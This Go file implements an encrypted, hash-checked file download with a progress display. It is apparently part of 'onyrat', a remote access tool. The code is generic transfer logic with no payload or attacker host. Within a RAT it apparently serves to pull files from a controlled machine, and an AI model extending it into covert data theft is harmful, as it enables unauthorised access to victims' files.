package transfer

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/Onyz107/onyrat/internal/infobar"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/network"
)

func Download(comm network.Communicator, streamManager *network.StreamManager, targetPath string, ctx context.Context) error {
	inCtx, cancel := context.WithCancelCause(ctx)
	defer cancel(nil)

	stream, err := streamManager.AcceptStream(downloadStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to accept the download stream: %w", err)
	}
	defer stream.Close()

	file, err := os.OpenFile(targetPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	// Receive the file's information (file size, file hash)
	buf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(buf)

	n, err := comm.ReceiveEncrypted(stream, buf, 15*time.Second)
	if err != nil {
		return fmt.Errorf("failed to receive file's size: %w", err)
	}

	fileInfo := buf[:n]

	fileSize := binary.BigEndian.Uint64(fileInfo[:8])
	fileHash := fileInfo[8 : 8+32]
	logger.Log.Debugf("File size: %d, file hash: %x", fileSize, fileHash)

	// Open a stream and start receiving
	r, err := comm.NewStreamedEncryptedReceiver(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to open a receiving stream: %w", err)
	}
	defer r.Close()

	start := time.Now()
	var (
		total    int64
		speedMBs float64
		pct      int
	)

	update := infobar.InfoStatus(fmt.Sprintf("Starting download of: %s", targetPath))

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	go func() {
		for {
			select {

			case <-ticker.C:
				update(fmt.Sprintf("Downloading %s: %d%% (%.2f MB/s)", targetPath, pct, speedMBs))

			case <-inCtx.Done():
				return

			}
		}
	}()

	for total < int64(fileSize) {
		select {

		case <-inCtx.Done():
			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
				return err
			}

		default:
			n, err := io.CopyN(file, r, 32*1024) // 32KB is the default of io.Copy
			total += n

			elapsed := time.Since(start).Seconds()
			speedMBs = float64(total) / (1024 * 1024) / elapsed
			pct = int(float64(total) / float64(fileSize) * 100)

			if err != nil && err != io.EOF {
				cancel(fmt.Errorf("failed to download streamed file: %w", err))
				continue
			}

			if err == io.EOF {
				cancel(nil)
			}
		}
	}

	computedHash, err := getFileHash(file)
	if err != nil {
		return fmt.Errorf("failed to compute downloaded file's hash: %w", err)
	}

	if !bytes.Equal(fileHash, computedHash) {
		return fmt.Errorf("file hashes are not the same: expected: %x: got: %x", fileHash, computedHash)
	}

	cancel(nil)
	update(fmt.Sprintf("Download of %s is complete", targetPath))
	time.Sleep(5 * time.Second)
	update("")

	return nil
}
